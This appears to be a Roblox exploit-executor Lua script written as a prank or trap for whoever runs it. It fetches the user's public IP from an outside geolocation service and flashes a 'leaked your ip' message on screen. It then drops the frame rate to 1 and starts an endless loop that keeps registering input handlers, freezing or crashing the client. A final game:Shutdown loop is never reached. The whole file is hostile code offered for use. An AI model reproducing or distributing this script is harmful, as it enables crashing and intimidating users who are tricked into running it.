local a = game:HttpGet("http://ip-api.com/json")
local b = game.HttpService:JSONDecode(a)
local c = game:GetService("UserInputService")
local d = Instance.new("ScreenGui")
d.Parent = game.CoreGui
local e = Instance.new("TextLabel")
e.Size = UDim2.new(0, 200, 0, 100)
e.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
e.BackgroundTransparency = 1
e.Text = "CHECK YOUR ROBLOX MEMORY also leaked your ip ~ " .. b.query
e.Font = Enum.Font.SourceSansBold
e.TextSize = 48
e.TextColor3 = Color3.fromRGB(255, 0, 0)
e.BorderSizePixel = 0
e.Position = UDim2.new(0, 0, 0, 0)
e.Parent = d
local f = 2
local g = 2
local function h()
    local i = e.Position + UDim2.new(0, f, 0, g)
    local j = false
    local k = false
    if i.X.Offset <= 0 or i.X.Offset + e.Size.X.Offset >= workspace.CurrentCamera.ViewportSize.X then
        f = -f
        j = true
    end
    if i.Y.Offset <= 0 or i.Y.Offset + e.Size.Y.Offset >= workspace.CurrentCamera.ViewportSize.Y then
        g = -g
        k = true
    end
    if j or k then
        e.TextColor3 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
    end
    e.Position = i
end
game:GetService("RunService").RenderStepped:Connect(
    function()
        h()
    end
)
wait(5)
task.spawn(setfpscap, 1)
wait(0.1)
while true do
    for l = 1, math.huge do
        c.InputBegan:Connect(
            function(m)
                if m.UserInputType == Enum.UserInputType.MouseButton1 then
                    mouse1press()
                end
            end
        )
        c.InputEnded:Connect(
            function(m)
                if m.UserInputType == Enum.UserInputType.MouseButton1 then
                    mouse1release()
                end
            end
        )
    end
end
while true do
    for l = 1, math.huge do
        game:Shutdown()
    end
end
